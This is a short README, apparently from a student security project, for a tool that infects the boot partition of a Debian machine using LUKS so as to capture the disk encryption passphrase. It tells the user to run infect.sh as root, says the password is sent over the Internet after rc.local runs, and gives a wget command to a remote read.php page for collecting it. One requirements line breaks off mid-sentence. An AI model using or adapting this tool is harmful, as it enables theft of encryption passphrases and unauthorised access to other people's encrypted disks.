LUKS infection under Debian
===========================

## Requirements

- A physical access on the targeted device to boot as root on an USB key,
  or a root access on any Unix system on the device.
- The targeted device must use LUKS and a Debian-like operating system (you
  can try on other init based Unix system, but nothing is guaranteed...).
- Please make sure that every shell script in this directory


## Set up

Run `infect.sh` as root to automatically infect the boot partition using LUKS on
this computer.
  
  
## Password retrieval

The password will be sent over the Internet 60 seconds after rc.local has been
executed (as long as the targeted device is connected).

It can be retrieved here:
  
    wget http://uuu.enseirb-matmeca.fr/~fmonjalet/secu/read.php
